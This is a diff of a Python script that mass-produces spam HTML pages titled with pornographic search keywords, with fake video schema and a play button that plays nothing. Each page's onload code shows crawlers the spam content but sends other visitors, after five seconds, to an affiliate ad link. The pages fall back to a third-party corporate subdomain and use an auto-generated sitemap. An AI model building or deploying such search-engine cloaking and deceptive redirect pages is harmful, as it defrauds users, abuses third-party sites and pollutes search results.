@@ -8,20 +8,17 @@ import base64
 class UltraAggressiveSEO:
     def __init__(self):
         self.main_folder = "news"
-        # مجلدات بسيطة ونظيفة بدون hashes أو أرقام
         self.base_subfolders = ["trending", "video", "cinema", "hot", "updates"]
-        self.max_files_per_folder = 300  # معقول للسرعة بدون إفراط
-        self.domain = self._get_domain()  # دايمًا من CNAME
+        self.max_files_per_folder = 300
+        self.domain = self._get_domain()
         
-        # اسم ملف السايت ماب random شوية
         self.sitemap_index_file = f"index_map_{''.join(random.choices(string.ascii_lowercase, k=4))}.xml"
         
-        self.redirect_url = "https://accumulaterehearsehealing.com/v8f7nbpnim?key=7f6a5217f51c6a62c1c630a20f2d2a75"  # affiliate link زي viralsvideo
+        self.redirect_url = "https://accumulaterehearsehealing.com/v8f7nbpnim?key=7f6a5217f51c6a62c1c630a20f2d2a75"
         self.affiliate_url = self.redirect_url
         
-        self.keywords_ar = self._load_keywords("keywords_ar.txt", ["سكس عربي", "نيك", "سكس مصري", "سكس مترجم", "سكس محارم"])
-        self.keywords_en = self._load_keywords("keywords_en.txt", ["xnxx", "porn", "sex video", "sexy", "XNXX"])
-        self.keywords_in = self._load_keywords("keywords_in.txt", ["देसी सेक्स", "भाभी की चुत", "हिन्दी सेक्स फीडियो", "देसी भाभी", "गाँड मारना"])
+        self.keywords_ar = self._load_keywords("keywords_ar.txt")
+        self.keywords_en = self._load_keywords("keywords_en.txt")
         
         self.aggro_styles = {
             "ar": {
@@ -43,7 +40,7 @@ class UltraAggressiveSEO:
 
         self.template_power_words = ["حصرياً", "بدقة عالية", "HD 1080p", "بدون إعلانات", "Full Movie", "HD Video"]
 
-        # Template مشابه جدًا لـ viralsvideo مع دعم عربي/RTL + cloaking + fake elements
+        # القالب المحسن والمحترف (بدون صور، روابط خارجية فقط رابط الإعلان، cloaking قوي)
         self.movie_template = """<!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
@@ -56,13 +53,10 @@ class UltraAggressiveSEO:
     <!-- Open Graph -->
     <meta property="og:title" content="{{TITLE}}">
     <meta property="og:description" content="{{DESCRIPTION}}">
-    <meta property="og:image" content="{{IMAGE}}">
     <meta property="og:type" content="video.other">
     
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
-
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
+    
     <!-- Google Analytics -->
     <script async src="https://www.googletagmanager.com/gtag/js?id=G-6F11LYMH9P"></script>
     <script>
@@ -71,7 +65,7 @@ class UltraAggressiveSEO:
       gtag('js', new Date());
       gtag('config', 'G-6F11LYMH9P');
     </script>
-
+    
     <!-- Video Schema -->
     <script type="application/ld+json">
     {
@@ -79,7 +73,6 @@ class UltraAggressiveSEO:
       "@type": "VideoObject",
       "name": "{{TITLE}}",
       "description": "{{DESCRIPTION}}",
-      "thumbnailUrl": "{{IMAGE}}",
       "uploadDate": "{{TIME_ISO}}",
       "duration": "PT10M30S",
       "embedUrl": "{{CANONICAL_URL}}",
@@ -95,28 +88,28 @@ class UltraAggressiveSEO:
 
     <style>
         body { background:#000; color:#fff; font-family:'Cairo',sans-serif; margin:0; padding:0; text-align:center; }
-        .container { max-width:1100px; margin:20px auto; padding:15px; }
+        .container { max-width:1000px; margin:20px auto; padding:15px; }
         h1 { color:#e50914; }
-        .player { position:relative; width:100%; max-width:800px; margin:auto; background:#111; border-radius:10px; overflow:hidden; }
-        .thumbnail { cursor:pointer; }
-        .play-btn { position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); font-size:80px; color:#e50914; }
-        .controls { background:rgba(0,0,0,0.7); padding:10px; }
+        .player { position:relative; width:100%; max-width:800px; margin:auto; background:#111; border-radius:10px; overflow:hidden; cursor:pointer; height:450px; display:flex; align-items:center; justify-content:center; }
+        .play-btn { font-size:100px; color:#e50914; }
+        .btn { background:#e50914; color:#fff; padding:12px 30px; border:none; border-radius:5px; font-size:18px; cursor:pointer; text-decoration:none; display:inline-block; margin:15px; }
+        .btn:hover { background:#b2070f; }
     </style>
 </head>
 <body onload="setTimeout(()=>{if(!navigator.userAgent.match(/bot|crawl|spider/i)){window.location='{{REDIRECT_URL}}';}},5000)">
     <div class="container">
         <h1>{{TITLE}}</h1>
-        <div class="player">
-            <img class="thumbnail" src="{{IMAGE}}" alt="Video" onclick="window.location='{{REDIRECT_URL}}'">
+        
+        <div class="player" onclick="window.location='{{REDIRECT_URL}}'">
             <div class="play-btn">▶</div>
         </div>
-        <div class="controls">شاهد الآن {{TITLE}} بجودة HD - {{DESCRIPTION}}</div>
-        <br>
-        <p>محتوى حصري - اضغط للمشاهدة</p>
-        <div>روابط مقترحة: {{INTERNAL_LINKS}}</div>
+        
+        <a href="{{REDIRECT_URL}}" class="btn">شاهد الآن</a>
+        
+        <p>{{DESCRIPTION}} - محتوى حصري بجودة عالية</p>
     </div>
 
-    <!-- Tracking -->
+    <!-- Tracking Scripts -->
     <script type="text/javascript">var _Hasync= _Hasync|| [];
 _Hasync.push(['Histats.start', '1,4897089,4,0,0,0,00010000']);
 (function() {
@@ -143,7 +136,7 @@ hs.src = ('//s10.histats.com/js15_as.js');
                 domain = f.read().strip()
                 if domain:
                     return domain
-        return "docs.biztex.co.jp"  # fallback فقط
+        return "docs.biztex.co.jp"
 
     def get_target_subfolder(self):
         if not os.path.exists(self.main_folder):
@@ -158,16 +151,15 @@ hs.src = ('//s10.histats.com/js15_as.js');
                 return folder
 
         base = random.choice(self.base_subfolders)
-        new_folder_name = base  # بسيط بدون hash
-        full_path = os.path.join(self.main_folder, new_folder_name)
+        full_path = os.path.join(self.main_folder, base)
         if not os.path.exists(full_path):
             os.makedirs(full_path)
-        return new_folder_name
+        return base
 
     def generate_content_for_lang(self, lang_code):
         cfg = self.aggro_styles[lang_code]
         prefix = random.choice(cfg["prefixes"])
-        words_count = random.randint(4, 9)
+        words_count = random.randint(3, 7)  # أقصر 3، أطول 7 كلمات
         selected_keywords = random.sample(cfg["keywords"], min(len(cfg["keywords"]), words_count))
         suffix = random.choice(cfg["suffixes"])
         title = f"{prefix} {' '.join(selected_keywords)} {suffix}"
@@ -177,7 +169,7 @@ hs.src = ('//s10.histats.com/js15_as.js');
     def clean_slug(self, title):
         clean = re.sub(r'[^a-zA-Z0-9\s\u0600-\u06FF\u0900-\u097F-]', '', title).lower()
         slug = re.sub(r'[\s-]+', '-', clean).strip('-')
-        return slug + ".html"  # بدون hash إضافي
+        return slug + ".html"
 
     def update_sitemap_index(self):
         all_files = os.listdir('.')
@@ -233,28 +225,20 @@ hs.src = ('//s10.histats.com/js15_as.js');
             lang = random.choice(languages)
             title, description = self.generate_content_for_lang(lang)
             slug = self.clean_slug(title)
-            image = "https://viralsvideo.online/picture/default_image.jpg"
             pages.append({
                 "title": title,
                 "description": description,
                 "slug": slug,
-                "url": f"https://{self.domain}/{self.main_folder}/{target_sub}/{slug}",
-                "image": image
+                "url": f"https://{self.domain}/{self.main_folder}/{target_sub}/{slug}"
             })
 
         for p in pages:
-            internal = "".join([f"<a href='{x['url']}'>{x['title']}</a><br>" for x in random.sample(pages, min(8, len(pages)))])
-            body_text = f"شاهد {p['title']} الآن بجودة عالية. {p['description']}."
-            
             final_html = self.movie_template.replace("{{TITLE}}", p['title'])\
                                            .replace("{{DESCRIPTION}}", p['description'])\
-                                           .replace("{{DYNAMIC_BODY}}", body_text)\
-                                           .replace("{{INTERNAL_LINKS}}", internal)\
                                            .replace("{{CANONICAL_URL}}", p['url'])\
                                            .replace("{{REDIRECT_URL}}", self.redirect_url)\
                                            .replace("{{AFFILIATE_URL}}", self.affiliate_url)\
                                            .replace("{{SITE_NAME}}", self.domain.split('.')[0].upper())\
-                                           .replace("{{IMAGE}}", p['image'])\
                                            .replace("{{TIME_ISO}}", datetime.utcnow().strftime("%Y-%m-%d"))
             
             encoded = base64.b64encode(final_html.encode('utf-8')).decode('utf-8')
@@ -269,4 +253,3 @@ hs.src = ('//s10.histats.com/js15_as.js');
 if __name__ == "__main__":
     bot = UltraAggressiveSEO()
     bot.run(count=150)
-
